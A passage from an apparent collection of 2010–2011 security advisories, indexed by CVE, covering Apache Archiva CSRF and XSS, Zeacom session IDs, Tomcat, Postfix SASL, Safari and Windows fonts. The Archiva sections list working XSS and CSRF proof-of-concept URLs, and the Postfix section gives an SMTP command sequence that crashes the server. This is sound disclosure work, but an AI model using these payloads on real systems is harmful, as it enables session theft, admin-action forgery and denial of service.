http://127.0.0.1:8080/archiva/admin/saveNetworkProxy.action?mode=add&pro
xy.id=ntwrk&proxy.protocol=http&proxy.host=test&proxy.port=8080&proxy.us
ername=&proxy.password=
http://127.0.0.1:8080/archiva/admin/deleteNetworkProxy!delete.action?pro
xyid=myproxy
http://127.0.0.1:8080/archiva/admin/repositoryScanning!addFiletypePatter
n.action?pattern=**%2F*.rum&fileTypeId=artifacts
http://127.0.0.1:8080/archiva/admin/repositoryScanning!removeFiletypePat
tern.action?pattern=**%2F*.rum&fileTypeId=artifacts
http://127.0.0.1:8080/archiva/admin/repositoryScanning!updateKnownConsum
ers.action?enabledKnownContentConsumers=auto-remove&enabledKnownContentC
onsumers=auto-rename&enabledKnownContentConsumers=create-missing-checksu
ms&enabledKnownContentConsumers=index-content&enabledKnownContentConsume
rs=metadata-updater&enabledKnownContentConsumers=repository-purge&enable
dKnownContentConsumers=update-db-artifact&enabledKnownContentConsumers=v
alidate-checksums
http://127.0.0.1:8080/archiva/admin/database!updateUnprocessedConsumers.
action?enabledUnprocessedConsumers=update-db-project
http://127.0.0.1:8080/archiva/admin/database!updateCleanupConsumers.acti
on?enabledCleanupConsumers=not-present-remove-db-artifact&enabledCleanup
Consumers=not-present-remove-db-project&enabledCleanupConsumers=not-pres
ent-remove-indexed
Warm Regards,
Riyaz Ahemed Walikar || Senior Engineer - Professional Services
Vulnerability Assessment & Penetration Testing
Mobile: +91-98860-42242 || Extn: 5601
The information transmitted is intended only for the person or entity to which it is addressed and may contain confidential and/or privileged material.
Any review, re-transmission, dissemination or other use of or taking of any action in reliance upon,this information by persons or entities other than the intended recipient is prohibited.
If you received this in error, please contact the sender and delete the material from your computer.
Microland takes all reasonable steps to ensure that its electronic communications are free from viruses.
However, given Internet accessibility, the Company cannot accept liability for any virus introduced by this e-mail or any attachment and you are advised to use up-to-date virus checking software."
12413,[CVE-2011-1077] Apache Archiva Multiple XSS vulnerabilities,,CVE-2011-1077,"Hi,
This is regarding multiple XSS (Cross Site Scripting) Vulnerabilities in
Apache Archiva 1.3.4 (and previous versions). The following is the
disclosure document
Project: Apache Archiva
Severity: High
Versions: 1.3.0 - 1.3.4. The unsupported versions Archiva 1.0 - 1.2.2
are also affected.
Exploit type: Multiple XSS
Mitigation: Archiva 1.3.4 and earlier users should upgrade to 1.3.5
Vendor URL: http://archiva.apache.org/security.html
CVE: CVE-ID-2011-1077
--------------------------------------------------------------------
Timeline:
28 February 2011: Vendor Contacted
1 March 2011: Vendor Response received. CVE-2011-1026 for CSRF Issues
Assigned.
7 March 2011: CVE-2011-1077 Assigned for XSS Issues.
14 March 2011: Fixes released to selected channels / Found to be
insufficient
27 May 2011: Vendor releases v1.3.5
27 May 2011: Vendor releases security disclosure to Bugtraq and FD.
30 May 2011: Exploit details released.
--------------------------------------------------------------------
Product Description:
Apache Archiva is an extensible repository management software that
helps taking care of your own personal or enterprise-wide build artifact
repository. It is the perfect companion for build tools such as Maven,
Continuum, and ANT.
Archiva offers several capabilities, amongst which remote repository
proxying, security access management, build artifact storage, delivery,
browsing, indexing and usage reporting, extensible scanning
functionality... and many more!
(Source: http://archiva.apache.org/)
--------------------------------------------------------------------
Vulnerability Details:
User can insert HTML or execute arbitrary JavaScript code within the
vulnerable application. The vulnerabilities arise due to insufficient
input validation in multiple input fields throughout the application.
Successful exploitation of these vulnerabilities could result in, but
not limited to, compromise of the application, theft of
cookie-based authentication credentials, arbitrary url redirection,
disclosure or modification of sensitive data and phishing attacks.
----------------------------------------------------------------------
Proof of Concept:
Reflected XSS:
http://127.0.0.1:8080/archiva/security/useredit.action?username=test%3Cs
cript%3Ealert%28%27xss%27%29%3C/script%3E
http://127.0.0.1:8080/archiva/security/roleedit.action?name=%22%3E%3Cscr
ipt%3Ealert%28%27xss%27%29%3C%2Fscript%3E
http://127.0.0.1:8080/archiva/security/userlist!show.action?roleName=tes
t%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
http://127.0.0.1:8080/archiva/deleteArtifact!doDelete.action?groupId=1<s
cript>alert('xss')</script>&artifactId=1<script>alert('xss')</script>&ve
rsion=1&repositoryId=internal
http://127.0.0.1:8080/archiva/admin/addLegacyArtifactPath!commit.action?
legacyArtifactPath.path=test%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript
%3E&groupId=test%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&artifact
Id=test%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&version=test%3Csc
ript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&classifier=test%3Cscript%3Eal
ert%28%27xss%27%29%3C%2Fscript%3E&type=test%3Cscript%3Ealert%28%27xss%27
%29%3C%2Fscript%3E
http://127.0.0.1:8080/archiva/admin/deleteNetworkProxy!confirm.action?pr
oxyid=test%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
Persistant (Stored) XSS:
Exploit code: test<script>alert('xss')</script>
http://127.0.0.1:8080/archiva/admin/addRepository.action
(Identifier:repository.id, Name:repository.name,
Directory:repository.location, Index Directory:repository.indexDir)
http://127.0.0.1:8080/archiva/admin/confirmDeleteRepository.action?repoi
d=
http://127.0.0.1:8080/archiva/admin/editAppearance.action
(Name:organisationName, URL:organisation:URL, LogoURL:organisation:URL)
http://127.0.0.1:8080/archiva/admin/configureAppearance.action
http://127.0.0.1:8080/archiva/admin/addLegacyArtifactPath.action(Path:na
me=legacyArtifactPath.path, GroupId:groupId, ArtifactId:artifactId,
Version:version, Classifier:classifier, Type:type)
http://127.0.0.1:8080/archiva/admin/legacyArtifactPath.action
http://127.0.0.1:8080/archiva/admin/addNetworkProxy.action
(Identifier:proxy.id, Protocol:proxy.protocol, Hostname:proxy.host,
Port:proxy.port, Username:proxy.username)
http://127.0.0.1:8080/archiva/admin/networkProxies.action
---------------------------------------------------------------------
Warm Regards,
Riyaz Ahemed Walikar || Senior Engineer - Professional Services
Vulnerability Assessment & Penetration Testing
Mobile: +91-98860-42242 || Extn: 5601
The information transmitted is intended only for the person or entity to which it is addressed and may contain confidential and/or privileged material.
Any review, re-transmission, dissemination or other use of or taking of any action in reliance upon,this information by persons or entities other than the intended recipient is prohibited.
If you received this in error, please contact the sender and delete the material from your computer.
Microland takes all reasonable steps to ensure that its electronic communications are free from viruses.
However, given Internet accessibility, the Company cannot accept liability for any virus introduced by this e-mail or any attachment and you are advised to use up-to-date virus checking software."
12468,CVE-2010-0217 - Zeacom Chat Server JSESSIONID weak SessionID Vulnerability,,CVE-2010-0217,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Packetninjas L.L.C
www.packetninjas.net
-= Security Advisory =-
Advisory: Zeacom Chat Server JSESSIONID weak SessionID Vulnerability
Release Date: unknown
Last Modified: 09/27/2010
Author: Daniel Clemens [daniel.clemens[at]packetninjas.net]
Application: Zeacom Chat Application <= 5.0 SP4
Severity:
Usage of weak Weak Session management exists within the Zeacom web-chat application
enabling the bruteforce of the sessionid which can enable the hijacking of anothers chat session.
The Zeacom application handles new sessions through a 10 character string (JSESSIONID),
resulting in an effective 9 bit entropy level for session management. The end result of an
attack would enable an attacker to hijack a session where private information is revealed
within a chat session or a denial of service within the application server resulting in
a complete crash of the application server. (Tomcat)

In most scenarios the application would crash locking the application server.
Risk: Medium
Vendor Status: Zeacom
Vulnerability Reference: CVE-2010-0217
http://www.packetninjas.net/storage/advisories/Zeacom-CVE-2010-0217.txt
Overview:
Information provided from http://www.zeacom.com
""Zeacom is a leading provider of advanced Unified Communications solutions that integrate
real-time communication tools such as presence information, contact routing, conferencing,
chat and speech recognition with conventional tools such as voicemail, email and fax.""
During evaluation of a blackbox application assessment routine
application security checks were performed to test the strength of session
management within the Zeacom Chat application.
The Zeacom application handles new sessions through a 10 character string which
is a part of the JSESSIONID, which results in an effective 9 bit entropy level
for session management.
Proof of Concept:
By looking at the JSESSIONID, one is able to determine that it is trivial to brute force the session
id (JSESSIONID) space.
Disclosure Timeline:
April 1st, 2010 - Initial Contact with Zeacom.
April 6th, 2010 - Zeacom acknowledges the receipt of the initial communication.
April 20th, 2010 - Zeacom acknowledges that the version of Zeacom Chat server affected is <= 5.0 SP4.
- Zeacom also states that they will not be issuing a patch for customers running <= 5.0SP4
but will be moving clients to their new 5.1 release.

Recommendation:
- It is recommended to upgrade to the latest version of Zeacom Chat Server. (Version 5.1 or greater)
CVE Information: CVE-2010-0217
| Daniel Uriah Clemens
| Packetninjas L.L.C | | http://www.packetninjas.net
| c. 205.567.6850 | | o. 866.267.8851
""Moments of sorrow are moments of sobriety""
-----BEGIN PGP SIGNATURE-----
iD8DBQFN0vtvlZy1vkUrR4MRAjx3AJ9k6Kj3Ih3LVjabVQE0E+DerZeG0wCfY0dI
lKUHztAtnNG6FH4ZphEl7Wc=
=aw+L
-----END PGP SIGNATURE-----"
12469,[SECURITY] CVE-2011-1582 Apache Tomcat security constraint bypass,,CVE-2011-1582,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2011-1582 Apache Tomcat security constraint bypass
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- - Tomcat 7.0.12-7.0.13
- - Earlier versions are not affected
Description:
An error in the fixes for CVE-2011-1088/CVE-2011-1183 meant that
security constraints configured via annotations were ignored on the
first request to a Servlet. Subsequent requests were secured correctly.
Mitigation:
Users of affected versions should apply one of the following mitigations:
- - Upgrade to a Tomcat 7.0.14 or later
- - Define all security constraints in web.xml
Credit:
This issue was identified by the Apache Tomcat security team.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBAgAGBQJN0m4vAAoJEBDAHFovYFnn5NkQAOBocyvRk9fTGX569Ga95yDJ
vV84ZS3D1jCP3VQ1swh1Ouzd9NdP9pRGVWysTjz6N1bsZ+BMpGIyT/GpMqhfPAPx
OzzbkM2cNow8MR/PG3rFbYjQH1r6D400zSu+drHDtTzrOY2uXS2ClL0UuxUg9LcN
tUfidh9629OMVtuWqA2jwTSrc7fDdye5Ti1HZ0g5vUG5Cvab4LCcRdwh2VWT7g3T
LKUTr6AZAz0mQ/7+QNJOOykX+FJcOL99Q46NLVZzeLPWFoEBZn/BRs8O9WehYnLV
EEZtARSaUzTjssePo/O+oV4xYW5JIA1+5sKG7+xIvIaWKMbIPbdrPEPZusK/X0QR
LjdLbMUGcGzDUVNP0hGzpArIDXcWmslJKJ3YFTCg3VdeamULh12bqxw3AtliAzI9
pSTcMcVNOMWZOUl/Czc2I3t5ehWaOGr5j3D7No8mEFMCcRoQoRTNS7hKqqqKsyY4
hTxMJV9dXox5mIuDY8hLaGY9KuUFIo2AXWnr7lqIBrKGrziVAySuIpKSnzuFvz2z
q2DjPnXrFo/5W2ZVfUk0utCjyJX/NJdizKmW9PdQu4aT2BJdEgjjiW+qzPi20kZy
HgySY8kEFbI8CyM6PqD6Yb5nzA/xR1YAYRQx1pWTrE5Y0B5MTctAaPCIJQoc3nIA
GZ0Ziz0q/PX/x7ug1TnP
=srIH
-----END PGP SIGNATURE-----"
12537,Memory corruption in Postfix SMTP server Cyrus SASL support (CVE-2011-1720),,CVE-2011-1720,"[On-line version will be at http://www.postfix.org/CVE-2011-1720.html]
Summary
=======
The Postfix SMTP server has a memory corruption error when the Cyrus
SASL library is used with authentication mechanisms other than PLAIN
and LOGIN (the ANONYMOUS mechanism is unaffected but should not be
enabled for different reasons). See below for instructions to
determine what systems are affected.
Examples of affected Cyrus SASL authentication methods are CRAM-MD5,
DIGEST-MD5, EXTERNAL, GSSAPI, KERBEROS_V4, NTLM, OTP, PASSDSS-3DES-1,
and SRP.
The error was introduced with the Postfix SASL patch, and is present
in all Postfix versions where the command ""postconf mail_release_date""
reports a value of 20000314 (March 14, 2000) or greater.
This problem was discovered by Thomas Jarosch of Intra2net AG.
The memory corruption is known to result in a program crash (SIGSEV).
Remote code execution cannot be excluded. Such code would execute
as the unprivileged ""postfix"" user. This user has no control over
processes that run with non-postfix privileges including Postfix
processes running as root; the impact may be reduced with configurations
that enable the Postfix chroot feature or that use platform-dependent
privilege-reducing features.
The problem is fixed in Postfix stable releases 2.5.13, 2.6.10,
2.7.4, 2.8.3; in the Postfix 2.9 development release as of May 1,
2011; patches exist for Postfix version 1.1 and later. All this is
available from Postfix mirrors at http://www.postfix.org/download.html.
What systems are affected
=========================
The Postfix SMTP client is not affected.
Affected are Postfix SMTP server configurations that have SASL
authentication turned on, and that use Cyrus SASL authentication
mechanisms other than ANONYMOUS, PLAIN and LOGIN. Here,
* the command ""postconf smtpd_sasl_auth_enable"" produces as output
""smtpd_sasl_auth_enable = yes"";
* and the command ""postconf smtpd_sasl_type"" produces as output
""smtpd_sasl_type = cyrus"" (or ""smtpd_sasl_type: unknown
parameter"");
* and the Postfix SMTP server's reply to the EHLO command shows
AUTH methods other than ANONYMOUS, PLAIN and LOGIN. Examples
of other methods are CRAM-MD5 or DIGEST-MD5.
Example for the ""port 25"" service:
$ telnet server.example.com 25
Connected to server.example.com.
Escape character is '^]'.
220 server.example.com ESMTP Postfix
ehlo client.example.com
250-server.example.com
250-PIPELINING
250-SIZE 10240000
250-STARTTLS
250-AUTH DIGEST-MD5 LOGIN PLAIN CRAM-MD5
250-AUTH=DIGEST-MD5 LOGIN PLAIN CRAM-MD5
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
quit
221 2.0.0 Bye
Connection closed by foreign host.
Example for the ""port 587"" (submission) service. This service
is not enabled by default.
$ openssl s_client -quiet -starttls smtp -connect server.example.com:587
[TLS handshake information deleted]
250 DSN
ehlo client.example.com
250-server.example.com
250-PIPELINING
250-SIZE 10240000
250-AUTH DIGEST-MD5 LOGIN PLAIN CRAM-MD5
250-AUTH=DIGEST-MD5 LOGIN PLAIN CRAM-MD5
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
quit
221 2.0.0 Bye
Although it is not affected, the ANONYMOUS authentication mechanism
should not be enabled as it can make an SMTP server an open relay.
What systems are not affected
=============================
The Postfix SMTP client is not affected.
Not affected are Postfix SMTP server configurations that have SASL
authentication turned off, including configurations without SASL
support compiled in. Here, the command ""postconf smtpd_sasl_auth_enable""
produces as output ""smtpd_sasl_auth_enable = no"".
Not affected are Postfix SMTP server configurations that use Dovecot
SASL instead of Cyrus SASL. Here, the command ""postconf smtpd_sasl_type""
produces as output ""smtpd_sasl_type = dovecot"".
Not affected are Postfix SMTP server configurations that enable
Cyrus SASL support with only the PLAIN or LOGIN methods, or both.
Here,
* the command ""postconf smtpd_sasl_auth_enable"" produces as output
""smtpd_sasl_auth_enable = yes"";
* and the command ""postconf smtpd_sasl_type"" produces as output
""smtpd_sasl_type = cyrus"" (or ""smtpd_sasl_type: unknown
parameter"");
* and the Postfix SMTP server's reply to the EHLO command shows
only AUTH mechanisms of PLAIN, LOGIN, or both.
Example for the ""port 25"" service:
$ telnet server.example.com 25
Connected to server.example.com.
Escape character is '^]'.
220 server.example.com ESMTP Postfix
ehlo client.example.com
250-server.example.com
250-PIPELINING
250-SIZE 10240000
250-STARTTLS
250-AUTH LOGIN PLAIN
250-AUTH=LOGIN PLAIN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
quit
221 2.0.0 Bye
Connection closed by foreign host.
Example for the ""port 587"" (submission) service. This service
is not enabled by default.
$ openssl s_client -quiet -starttls smtp -connect server.example.com:587
[TLS handshake information deleted]
250 DSN
ehlo client.example.com
250-server.example.com
250-PIPELINING
250-SIZE 10240000
250-AUTH LOGIN PLAIN
250-AUTH=LOGIN PLAIN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
quit
221 2.0.0 Bye
Not affected is the ANONYMOUS authentication mechanism, but this
should not be enabled as it can make an SMTP server an open relay.
Workarounds
===========
Disable Cyrus SASL authentication mechanisms for the Postfix SMTP
server other than PLAIN and LOGIN. The mechanisms are specified in
a Cyrus SASL smtpd.conf configuration file. This file may be found
in /etc/postfix/sasl/, /var/lib/ sasl2/, /etc/sasl2/, /usr/lib/sasl2/
or /usr/local/lib/sasl2/.
In this file, update the ""mech_list:"" entry and remove any methods
other than PLAIN and LOGIN. For example, this configuration is not
affected:
mech_list: PLAIN LOGIN
Execute the command ""postfix reload"" to make the change effective,
then verify that the ""port 25"" and ""port 587"" services no longer
announce other SASL mechanisms, as shown in the previous section.
Technical details
=================
The Postfix SMTP server creates a SASL handle for each SMTP session,
when SASL authentication is enabled. The Postfix SMTP server will
use this SASL handle until it closes the SMTP connection (the Postfix
SMTP server may create a new server SASL handle when the client and
server agree to switch from a plaintext session to a TLS-encrypted
session, but this does not eliminate the memory corruption problem).
According to a comment in a Cyrus SASL include source file, a server
must not reuse a Cyrus SASL server handle after client authentication
failure. Instead, a server must create a new Cyrus SASL server
handle including mechanism list, before processing another client
authentication request.
The Postfix SMTP server fails to create a new Cyrus SASL server
handle after authentication failure. This causes memory corruption
when, for example, a client requests CRAM-MD5 authentication, fails
to authenticate, and then invokes some other authentication mechanism
except PLAIN (or ANONYMOUS if available). The likely outcome is
that the Postfix SMTP server process crashes with a segmentation
violation error (SIGSEGV, a.k.a. signal 11).
In the following example, S: indicates server output and C: indicates
client input. Line numbers are prepended for reference in the
background discussion in the next section.
1 S: 220 server.example.com ESMTP
2 C: EHLO client.example.com
3 S: 250-server.example.com
4 S: ...other server output skipped...
5 S: 250-AUTH DIGEST-MD5 LOGIN PLAIN CRAM-MD5
6 S: 250-AUTH=DIGEST-MD5 LOGIN PLAIN CRAM-MD5
7 S: ...other server output skipped...
8 C: AUTH CRAM-MD5
9 S: 334 PDg5ODE0OTI3MS4xMDQyMTg1OUBzZXJ2ZXIuZXhhbXBsZS5jb20+Cg==
10 C: *
11 S: 501 5.7.0 Authentication aborted
12 C: AUTH DIGEST-MD5
13 Connection closed by foreign host.
In the mail logfile, Postfix will log a warning similar to:
postfix/master[2213]: warning: process /usr/libexec/postfix/smtpd
pid 22585 killed by signal 11
Background
==========
Each Cyrus SASL authentication mechanism is implemented with a) one
statically-allocated shared data structure containing data and
pointers to functions that implement the mechanism, and b)
dynamically-allocated session context data structures with
authentication state.
When the Postfix SMTP server receives ""AUTH CRAM-MD5"" (line 8 above),
the Cyrus SASL CRAM-MD5 method initializes one CRAM-MD5 session
context data structure, and generates the ""step 1"" initial client
challenge which the Postfix SMTP server sends in line 9 above.
When the SMTP client sends ""*"" to abort the CRAM-MD5 authentication
request (line 10 above), the CRAM-MD5 session context data structure
remains attached to the Cyrus SASL server handle. Postfix fails to
create a new Cyrus SASL server handle when the client sends the
subsequent ""AUTH DIGEST-MD5"" request (line 12 above); the DIGEST-MD5
method will therefore use the ""wrong"" session context data structure
(which was created after the ""AUTH CRAM-MD5"" request on line 8),
and will skip its ""step 1"" challenge.
Each Cyrus SASL authentication method has a different context data
structure layout. Because of these differences, the bits from the
CRAM-MD5 method's context data structure will not work as intended
with the DIGEST-MD5 method. As shown in the stack trace below, the
Postfix SMTP server process crashes in ""step 2"" of the DIGEST-MD5
authentication protocol. This happens while attempting to read from
a pointer that contains an invalid address.
In this particular example, the Postfix SMTP server crashes while
running under control of the GDB debugger (see the Postfix master(5)
manpage discussion of the -D option), while processing the SMTP
commands shown in the example above.
(gdb) where
#0 0x884bbedf in clear_reauth_entry (reauth=0x206e6f69, type=SERVER,
utils=0x88534400) at digestmd5.c:1579
#1 0x884be648 in digestmd5_server_mech_step2 (stext=0x88518150,
sparams=0x8850c840, clientin=0x0, clientinlen=0, serverout=0xbfbfe140,
serveroutlen=0xbfbfe144, oparams=0x8855e860) at digestmd5.c:2588
#2 0x884be9c5 in digestmd5_server_mech_step (conn_context=0x88518150,
sparams=0x8850c840, clientin=0x0, clientinlen=0, serverout=0xbfbfe140,
serveroutlen=0xbfbfe144, oparams=0x8855e860) at digestmd5.c:2689
#3 0x882a51e9 in sasl_server_step (conn=0x8855e000, clientin=0x0,
clientinlen=0, serverout=0xbfbfe140, serveroutlen=0xbfbfe144)
at server.c:1430
#4 0x882a5002 in sasl_server_start (conn=0x8855e000, mech=0x8854dc08
""DIGEST-MD5"", clientin=0x0, clientinlen=0, serverout=0xbfbfe140,
serveroutlen=0xbfbfe144) at server.c:1362
#5 0x08066bf7 in xsasl_cyrus_server_first (xp=0x8851af18,
sasl_method=0x8854dc08 ""DIGEST-MD5"", init_response=0x0,
reply=0x8851aee8) at xsasl_cyrus_server.c:529
[Remainder of stack trace omitted for brevity]
This stack trace was obtained after informing the GDB debugger of
SASL authentication methods that are linked in at runtime (example:
""add-symbol-file /usr/local/lib/sasl2/libdigestmd5.so.2 0x884b8e50"").
Without that information, GDB reports a corrupted stack, because
it does not know that the program is executing legitimate code.
Impact analysis
===============
What context data structure bits does the DIGEST-MD5 method inherit
from the aborted CRAM-MD5 authentication request? As mentioned
earlier, different Cyrus SASL authentication methods have different
per-session context data structures. In particular, the CRAM-MD5
method uses a small structure while DIGEST-MD5 uses a larger one.
The DIGEST-MD5 method will therefore access memory outside the block
that was allocated during the aborted CRAM-MD5 request. That is,
it accesses random memory on the heap. The contents of that memory
will depend on the malloc implementation and on the program execution
history.
Version 2.1.23 of the Cyrus SASL library implements 12 authentication
methods. Of these, 9 methods maintain server session context data
structures that contain some mix of data and data pointers. When
these are read from random heap memory, or from a structure that
was allocated for a different SASL mechanism, all kinds of things
could happen. This is why remote code execution cannot be excluded.
Why the Cyrus SASL PLAIN and LOGIN methods are not affected
===========================================================
There is no memory corruption problem with the ""AUTH PLAIN"" method,
because this does not use or create a dynamically-allocated session
context data structure. In particular, sending ""AUTH LOGIN"" after
aborting or failing an ""AUTH PLAIN"" request does not result in
memory corruption, because the PLAIN authentication method does not
allocate a session context data structure. Also, sending ""AUTH
PLAIN"" after aborting or failing an ""AUTH LOGIN"" request does not
result in memory corruption, because the PLAIN authentication method
ignores the per-session context data structure that is created by
the LOGIN authentication method. Finally, there is no memory
corruption when the LOGIN authentication method inherits a session
context data structure from an aborted or failed ""AUTH LOGIN""
request.
It is for these reasons that Postfix SMTP servers with Cyrus SASL
support for only PLAIN and LOGIN are not affected. Fortunately,
PLAIN + LOGIN is the most commonly-used configuration, usually
combined with TLS encryption to protect passwords on the wire. There
will be a minor memory leak, but the Postfix SMTP server limits the
number of failed requests and thereby limits the leak.
There is no memory corruption problem with the ""AUTH ANONYMOUS""
method, because just like ""AUTH PLAIN"" this does not create or use
a dynamically-allocated session context data structure. However,
""AUTH ANONYMOUS"" support should not be enabled as it can make an
SMTP server an open relay.
Timeline
========
* April 8, 2011: Thomas Jarosch (Intra2net AG) reported the
problem.
* April 18, 2011: After completing a detailed analysis of what
configurations are affected, and after testing solutions for
Postfix 1.1 .. 2.9, Wietse asked CERT/CC to notify vendors.
Thank you, CERT/CC.
* April 20, 2011: Pre-release versions available for Postfix 2.5
.. 2.8 and patches for Postfix 1.1 .. 2.9.
* Most vendors honored Wietse's request to avoid non-public
information in plaintext email headers or content. The exceptions
were SUSE and Red Hat. Shame on you, SUSE and Red Hat.
* May 9, 2011: Announcement and public release of fixes."
12731,VUPEN Security Research - Apple Safari Text Nodes Remote Use-after-free Vulnerability (CVE-2011-1344),,CVE-2011-1344,"VUPEN Security Research - Apple Safari Text Nodes Remote Use-after-free Vulnerability (CVE-2011-1344)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Apple Safari is a web browser developed by Apple. As of February 2010,
Safari was the fourth most widely used browser, with 4.45% of the
worldwide usage share of web browsers according to Net Application.""
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Apple Safari.
The vulnerability is caused by a use-after-free error in the WebKit
library when processing certain text nodes, which could be exploited by
remote attackers to execute arbitrary code by tricking a user into
visiting a specially crafted web page.
CVSS Score: 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
III. AFFECTED PRODUCTS
---------------------------
Apple Safari version 5.0.4 and prior for Windows and Mac OS X
Apple iOS versions 3.0 through 4.3.1 for iPhone 3GS and later
Apple iOS versions 3.1 through 4.3.1 for iPod touch (3rd generation) and later
Apple iOS versions 3.2 through 4.3.1 for iPad
Apple iOS versions 4.2.5 through 4.2.6 for iPhone 4 (CDMA)
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
To proactively protect critical networks and infrastructures against unpatched
vulnerabilities and reduce risks related to zero-day attacks, VUPEN shares its
vulnerability research with governments and organizations members of the VUPEN
Threat Protection Program (TPP).
VUPEN TPP customers receive fully detailed and technical reports about security
vulnerabilities discovered by VUPEN and in advance of their public disclosure.
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Upgrade to Apple Safari version 5.0.5 for Windows and Mac OS X.
Upgrade to Apple iOS version 4.3.2 for iPhone, iPod, and iPad.
Upgrade to Apple iOS version 4.2.7 for iPhone 4 (CDMA).
VII. CREDIT
--------------
This vulnerability was discovered by Matthieu Bonetti of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/research-vuln.php
http://www.vupen.com/english/advisories/2011/0984
http://www.vupen.com/english/advisories/2011/0983
http://support.apple.com/kb/HT4596
http://support.apple.com/kb/HT4606
http://support.apple.com/kb/HT4607
X. DISCLOSURE TIMELINE
-----------------------------
2011-02-26 - Vulnerability Discovered by VUPEN
2011-04-14 - Apple updates available"
12732,VUPEN Security Research - Microsoft Windows OpenType CFF Driver Stack Overflow Vulnerability (CVE-2011-0034),,CVE-2011-0034,"VUPEN Security Research - Microsoft Windows OpenType CFF Driver Stack Overflow Vulnerability (CVE-2011-0034)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Windows is a series of software operating systems and graphical
user interfaces produced by Microsoft. Windows had approximately 90% of
the market share of the client operating systems."" (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Windows.
The vulnerability is caused by a stack overflow error in the OpenType
Compact Font Format (CFF) driver ""ATMFD.dll"" when processing certain
operands within an OpenType font, which could be exploited by remote
attackers to execute arbitrary code on a vulnerable Windows 7, Windows
Server 2008, Windows Server 2008 R2, and Windows Vista systems via a
malicious font, or by local attackers to gain elevated privileges on
Windows XP and Windows Server 2003 systems via a malicious application.
CVSS Score: 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
III. AFFECTED PRODUCTS
---------------------------
Microsoft Windows XP Service Pack 3
Microsoft Windows XP Professional x64 Edition Service Pack 2
Microsoft Windows Server 2003 Service Pack 2
Microsoft Windows Server 2003 x64 Edition Service Pack 2
Microsoft Windows Server 2003 SP2 (Itanium)
Microsoft Windows Vista Service Pack 1
Microsoft Windows Vista Service Pack 2
Microsoft Windows Vista x64 Edition Service Pack 1
Microsoft Windows Vista x64 Edition Service Pack 2
Microsoft Windows Server 2008 (32-bit)
Microsoft Windows Server 2008 (32-bit) Service Pack 2
Microsoft Windows Server 2008 (64x)
Microsoft Windows Server 2008 (64x) Service Pack 2
Microsoft Windows Server 2008 (Itanium)
Microsoft Windows Server 2008 (Itanium) Service Pack 2
Microsoft Windows 7 (32-bit)
Microsoft Windows 7 (32-bit) Service Pack 1
Microsoft Windows 7 (64x)
Microsoft Windows 7 (64x) Service Pack 1
Microsoft Windows Server 2008 R2 (64x)
Microsoft Windows Server 2008 R2 (64x) Service Pack 1
Microsoft Windows Server 2008 R2 (Itanium)
Microsoft Windows Server 2008 R2 (Itanium) Service Pack 1
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerability and a proof-of-concept code
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
To proactively protect critical networks and infrastructures against unpatched
vulnerabilities and reduce risks related to zero-day attacks, VUPEN shares its
vulnerability research with governments and organizations members of the VUPEN
Threat Protection Program (TPP).
VUPEN TPP customers receive fully detailed and technical reports about security
vulnerabilities discovered by VUPEN and in advance of their public disclosure.
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply the MS11-032 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Sebastien Renaud of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
